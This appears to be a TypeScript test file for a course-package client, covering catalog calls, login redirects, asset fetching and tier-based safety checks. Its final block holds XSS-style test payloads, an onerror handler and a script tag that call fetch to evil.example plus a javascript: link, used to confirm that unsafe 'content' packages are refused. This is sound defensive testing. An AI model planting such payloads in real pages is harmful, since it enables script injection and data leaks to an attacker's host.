import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';

// Same reasoning as api/client.test.ts: the 401 redirect is a hard
// `window.location` navigation, which jsdom does not implement. Mocked at
// the module boundary so these tests can assert WHETHER it was requested.
vi.mock('./navigation', () => ({
  redirectToLogin: vi.fn(),
}));

import { ApiError } from './client';
import { fetchPackage, fetchPackageAsset, listCourses, UnsafePackageError } from './courses';
import { redirectToLogin } from './navigation';

const server = setupServer();

beforeAll(() => server.listen({ onUnhandledRequest: 'error' }));
afterEach(() => {
  server.resetHandlers();
  vi.mocked(redirectToLogin).mockClear();
});
afterAll(() => server.close());

const encode = (text: string) => new TextEncoder().encode(text);
const decode = (bytes: Uint8Array) => new TextDecoder('utf-8').decode(bytes);

const manifest = {
  id: 'goi',
  title: 'Gói',
  description: '',
  lang: 'vi',
  version: '1.0.0',
  runtime: '^1',
  tier: 'content',
  parts: [
    {
      title: 'Phần 1',
      chapters: [
        { id: 'c1', num: '1.1', title: 'Một', short: 'Một', file: 'chapters/c1.html' },
        { id: 'c2', num: '1.2', title: 'Hai', short: 'Hai', file: 'chapters/c2.html' },
      ],
    },
  ],
};

describe('listCourses', () => {
  it('returns GET /courses as the catalog the server documents', async () => {
    server.use(
      http.get('/courses', () =>
        HttpResponse.json([
          { id: 'goi', title: 'Gói', lang: 'vi', tier: 'content', versions: ['1.0.0', '1.1.0'], pinned: '1.1.0' },
        ]),
      ),
    );

    await expect(listCourses()).resolves.toEqual([
      { id: 'goi', title: 'Gói', lang: 'vi', tier: 'content', versions: ['1.0.0', '1.1.0'], pinned: '1.1.0' },
    ]);
  });

  it('sends a 401 to /login by default — a library screen with a dead session has nothing left to render', async () => {
    server.use(http.get('/courses', () => new HttpResponse(null, { status: 401 })));

    await expect(listCourses()).rejects.toBeInstanceOf(ApiError);
    expect(redirectToLogin).toHaveBeenCalledTimes(1);
  });

  it('can be asked NOT to redirect, for the speculative call course/loader.ts makes', async () => {
    // `course/loader.ts` consults the catalog for a course that may simply
    // not exist, after the static directory has already refused. A
    // background probe that yanks the reader out of the page they are on is
    // a worse answer than the error the caller already had; `RequireAuth`
    // and `useMe` own the "your session died" transition, and this is not
    // them.
    server.use(http.get('/courses', () => new HttpResponse(null, { status: 401 })));

    await expect(listCourses({ redirectOn401: false })).rejects.toBeInstanceOf(ApiError);
    expect(redirectToLogin).not.toHaveBeenCalled();
  });
});

describe('fetchPackageAsset', () => {
  it('reads one file out of a stored package as BYTES, not as text or JSON', async () => {
    server.use(
      http.get('/courses/goi/@1.0.0/chapters/c1.html', () => new HttpResponse(encode('<h1>Một</h1>'))),
    );

    const bytes = await fetchPackageAsset('goi', '1.0.0', 'chapters/c1.html');
    expect(bytes).toBeInstanceOf(Uint8Array);
    expect(decode(bytes)).toBe('<h1>Một</h1>');
  });

  it('percent-encodes each path segment, and only the segments', async () => {
    // A course id or a version that contains a slash would otherwise
    // address a different package than the one it names — the same reason
    // the server refuses those ids outright (usecase.go's pathSafeParam).
    // The separators between segments must survive, or the asset path
    // stops being a path.
    let seen = '';
    server.use(
      http.get('/courses/*', ({ request }) => {
        seen = new URL(request.url).pathname;
        return new HttpResponse(encode('ok'));
      }),
    );

    await fetchPackageAsset('a b', '1.0.0', 'chapters/tên có dấu.html');
    expect(seen).toBe('/courses/a%20b/@1.0.0/chapters/t%C3%AAn%20c%C3%B3%20d%E1%BA%A5u.html');
  });

  it('throws ApiError with the status when the asset is not there', async () => {
    server.use(http.get('/courses/goi/@1.0.0/nope.html', () => new HttpResponse(null, { status: 404 })));

    const failure = fetchPackageAsset('goi', '1.0.0', 'nope.html');
    await expect(failure).rejects.toBeInstanceOf(ApiError);
    await expect(failure).rejects.toMatchObject({ status: 404 });
  });
});

describe('fetchPackage', () => {
  it('collects the manifest and every chapter file the manifest names', async () => {
    const requested: string[] = [];
    server.use(
      http.get('/courses/goi/@1.0.0/manifest.json', () => {
        requested.push('manifest.json');
        return new HttpResponse(encode(JSON.stringify(manifest)));
      }),
      http.get('/courses/goi/@1.0.0/chapters/:file', ({ params }) => {
        requested.push(`chapters/${params.file as string}`);
        return new HttpResponse(encode(`<h1>${params.file as string}</h1>`));
      }),
    );

    const files = await fetchPackage('goi', '1.0.0');

    expect(Object.keys(files).sort()).toEqual(['chapters/c1.html', 'chapters/c2.html', 'manifest.json']);
    expect(decode(files['chapters/c2.html'])).toBe('<h1>c2.html</h1>');
    expect(requested.sort()).toEqual(['chapters/c1.html', 'chapters/c2.html', 'manifest.json']);
  });

  it('requests a file named by two chapters exactly once', async () => {
    let hits = 0;
    const shared = {
      ...manifest,
      parts: [
        {
          title: 'Phần 1',
          chapters: [
            { id: 'c1', num: '1.1', title: 'Một', short: 'Một', file: 'chapters/shared.html' },
            { id: 'c2', num: '1.2', title: 'Hai', short: 'Hai', file: 'chapters/shared.html' },
          ],
        },
      ],
    };
    server.use(
      http.get('/courses/goi/@1.0.0/manifest.json', () => new HttpResponse(encode(JSON.stringify(shared)))),
      http.get('/courses/goi/@1.0.0/chapters/shared.html', () => {
        hits++;
        return new HttpResponse(encode('<h1>chung</h1>'));
      }),
    );

    await fetchPackage('goi', '1.0.0');
    expect(hits).toBe(1);
  });

  it('refuses a stored package whose manifest is not JSON, instead of returning a package with no chapters', async () => {
    // The failure mode this rules out is the quiet one: a manifest that
    // will not parse yields zero chapter names, and a package with a
    // manifest and no chapters looks like a successful download of an
    // empty course.
    server.use(
      http.get('/courses/goi/@1.0.0/manifest.json', () => new HttpResponse(encode('<html>not json</html>'))),
    );

    await expect(fetchPackage('goi', '1.0.0')).rejects.toThrow();
  });

  it('refuses a manifest that parses but names no chapters at all', async () => {
    server.use(http.get('/courses/goi/@1.0.0/manifest.json', () => new HttpResponse(encode('{"id":"goi"}'))));

    await expect(fetchPackage('goi', '1.0.0')).rejects.toThrow();
  });
});

/* ====================================================================== *
 * The tier rules, on the server route (ruling S1-F30, second half)
 * ====================================================================== */

/** Serves `manifest` plus one chapter body, at the stored-package routes. */
function servePackage(chapterHtml: string, over: Record<string, unknown> = {}) {
  const doc = {
    ...manifest,
    ...over,
    parts: [{ title: 'Phần 1', chapters: [{ id: 'c1', num: '1.1', title: 'Một', short: 'Một', file: 'chapters/c1.html' }] }],
  };
  server.use(
    http.get('/courses/goi/@1.0.0/manifest.json', () => new HttpResponse(encode(JSON.stringify(doc)))),
    http.get('/courses/goi/@1.0.0/chapters/c1.html', () => new HttpResponse(encode(chapterHtml))),
  );
}

describe('fetchPackage — a package that LIES about its tier', () => {
  const HOSTILE = '<p>Định nghĩa</p><img src="https://evil.example/leak" onerror="fetch(\'https://evil.example/x\')">';

  it('refuses a tier "content" package whose chapter carries an event handler', async () => {
    // Before this check, `fetchPackage` was the one route into the app that
    // never met `validatePackage` — `apps/api`'s `usecase.go` checks structure
    // and leaves this rule set to the client, and `course/import.ts` applied it
    // only to `/import`. So a package could declare `content`, carry `onerror`
    // through the server, and be drawn with a reassuring `content` badge.
    servePackage(HOSTILE, { tier: 'content' });

    const failure = fetchPackage('goi', '1.0.0');
    await expect(failure).rejects.toBeInstanceOf(UnsafePackageError);
    await expect(failure).rejects.toMatchObject({ courseId: 'goi', version: '1.0.0' });
    const error = await failure.catch((e: unknown) => e);
    expect(error).toBeInstanceOf(UnsafePackageError);
    expect((error as UnsafePackageError).findings.map((f) => f.code)).toContain('EVENT_HANDLER_ATTR');
  });

  it('refuses a tier "content" package with a <script> tag, and one with a javascript: url', async () => {
    servePackage('<p>x</p><script>fetch("https://evil.example")</script>', { tier: 'content' });
    await expect(fetchPackage('goi', '1.0.0')).rejects.toBeInstanceOf(UnsafePackageError);

    servePackage('<p><a href="javascript:fetch(1)">bấm</a></p>', { tier: 'content' });
    await expect(fetchPackage('goi', '1.0.0')).rejects.toBeInstanceOf(UnsafePackageError);
  });

  it('lets a clean tier "content" package through — a gate that refuses everything protects nothing', async () => {
    servePackage('<h1 class="ch-title">Một</h1><p>Chỉ có chữ.</p>', { tier: 'content' });

    const files = await fetchPackage('goi', '1.0.0');
    expect(Object.keys(files).sort()).toEqual(['chapters/c1.html', 'manifest.json']);
  });

  it('does NOT refuse the same chapter under tier "interactive" — and that is the limit, not an oversight', async () => {
    // An `interactive` package is entitled to ship JavaScript; §1.2 makes that
    // a labelled decision the reader is shown, not a rule to enforce. So this
    // check cannot be what keeps `previewUpdate` safe — the inert document in
    // `course/version.ts` (ruling S1-F30) is. Written down as a test so nobody
    // reads the refusals above as "downloads are now safe to parse".
    servePackage(HOSTILE, { tier: 'interactive' });

    await expect(fetchPackage('goi', '1.0.0')).resolves.toHaveProperty('chapters/c1.html');
  });

  it('does NOT refuse a manifest missing the registry-facing v2 fields — the server accepts those today', async () => {
    // `license`/`authors`/`generatedBy` are absent from the fixture manifest at
    // the top of this file, and from `courses/***REMOVED***`'s own v1
    // manifest. `apps/api`'s usecase.go does not require them either. Turning
    // this boundary into a v2 gate would make packages the server legitimately
    // stored unreadable on the device that stored them — a format migration,
    // taken by accident inside a security fix.
    servePackage('<p>Chỉ có chữ.</p>', { tier: 'content' });
    expect(manifest).not.toHaveProperty('license');

    await expect(fetchPackage('goi', '1.0.0')).resolves.toHaveProperty('manifest.json');
  });
});
